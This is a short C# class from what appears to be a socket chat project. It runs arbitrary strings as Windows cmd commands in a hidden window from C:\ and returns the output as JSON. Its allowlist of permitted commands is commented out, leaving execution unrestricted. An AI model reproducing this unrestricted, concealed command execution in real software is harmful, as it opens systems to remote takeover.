using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Diagnostics;
using System.IO;

namespace SocketsChatScriptConsola
{        
    class Comandos
    {
        List<String> comandosPermitidos = new List<string>();
        Process process = new Process();

        public Comandos() 
        {
           /* comandosPermitidos.Add("dir");
            comandosPermitidos.Add("cd..");
            comandosPermitidos.Add("cd Desktop");*/
        }

        public String ejecutarComando(String comando)
        {
            /*if (comandosPermitidos.Contains(comando))
            { */               
                //Habilita la redirección
                process.StartInfo.UseShellExecute = false;
                //No se cree una ventana
                process.StartInfo.CreateNoWindow = true;
                //Redirije la salida estandar 
                process.StartInfo.RedirectStandardOutput = true;
                //Oculta la ventana
                process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                //Configura comando a ajecutar
                process.StartInfo.FileName = "cmd";
                //Configura argumento del programa
                process.StartInfo.Arguments = "/C" + comando;
                //Directorio que se usara como BASE para la ejecución
                process.StartInfo.WorkingDirectory = @"C:\";
                //Guarda la salida del comando
                String strOutput = String.Empty;
                //Ejecuta el comando
                process.Start();
                //Guarda el resultado del proceso en la variable
                strOutput = process.StandardOutput.ReadToEnd();                
                // imprimimos el resultado
                System.Console.WriteLine(strOutput);
                // MessageBox.Show(strOutput);
                var javaScriptSerializerVar = new System.Web.Script.Serialization.JavaScriptSerializer();
                String jSON = javaScriptSerializerVar.Serialize(strOutput);
                return jSON;
           /* }
            else
                Console.WriteLine("Comando no permitido....");
            //return "";*/
        }


    }
}
